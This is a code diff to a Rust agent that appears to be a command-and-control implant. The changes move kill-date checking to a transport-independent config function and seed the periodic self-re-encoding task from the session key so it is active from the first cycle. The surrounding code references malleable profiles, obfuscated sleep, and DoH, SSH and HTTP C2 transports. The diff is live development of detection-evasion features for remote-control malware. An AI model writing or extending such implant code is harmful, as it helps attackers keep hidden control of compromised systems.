@@ -66,8 +66,11 @@ impl Agent {
         let cfg = config::load_config()?;
 
         // Enforce kill date from malleable profile at agent startup (4-2).
+        // Uses config::check_kill_date which is transport-independent so that
+        // kill-date enforcement works regardless of which transport features
+        // are compiled in.
         if !cfg.malleable_profile.kill_date.is_empty() {
-            crate::c2_http::check_kill_date_pub(&cfg.malleable_profile.kill_date)?;
+            crate::config::check_kill_date(&cfg.malleable_profile.kill_date)?;
         }
 
         // Derive the module-decryption key from configuration.
@@ -333,26 +336,28 @@ impl Agent {
         info!("Agent started, waiting for commands...");
         let mut tasks = tokio::task::JoinSet::new();
 
-        // Spawn the periodic self-re-encoding background task.  The seed is
-        // initially zero (no seed from C2 yet) and will be updated when the
-        // server sends `SetReencodeSeed`.  The task is a no-op until a seed
-        // is set.
+        // Spawn the periodic self-re-encoding background task.  Derive a
+        // non-zero default seed from the session key so the feature is active
+        // from the first cycle.  The seed will be updated when the server
+        // sends `SetReencodeSeed`.
         #[cfg(feature = "self-reencode")]
         {
             let interval = {
                 let cfg = self.config.read().await;
                 cfg.reencode_interval_secs
             };
+            let default_seed =
+                crate::self_reencode::derive_default_seed(self.crypto.key_bytes());
             let shutdown = crate::handlers::SHUTDOWN_NOTIFY.clone();
             tasks.spawn(async move {
                 let _ = crate::self_reencode::spawn_periodic_reencode(
-                    crate::self_reencode::current_seed(),
+                    default_seed,
                     std::time::Duration::from_secs(interval),
                     shutdown,
                 )
                 .await;
             });
-            info!("self-reencode background task spawned (interval={interval}s)");
+            info!("self-reencode background task spawned (interval={interval}s, seed=auto-derived)");
         }
 
         loop {
@@ -503,4 +508,5 @@ pub mod obfuscated_sleep;
 /// Startup transport priority is: SSH > DoH > HTTP > TLS fallback.
 #[cfg(feature = "doh-transport")]
 pub mod c2_doh;
+#[cfg(feature = "http-transport")]
 pub mod c2_http;
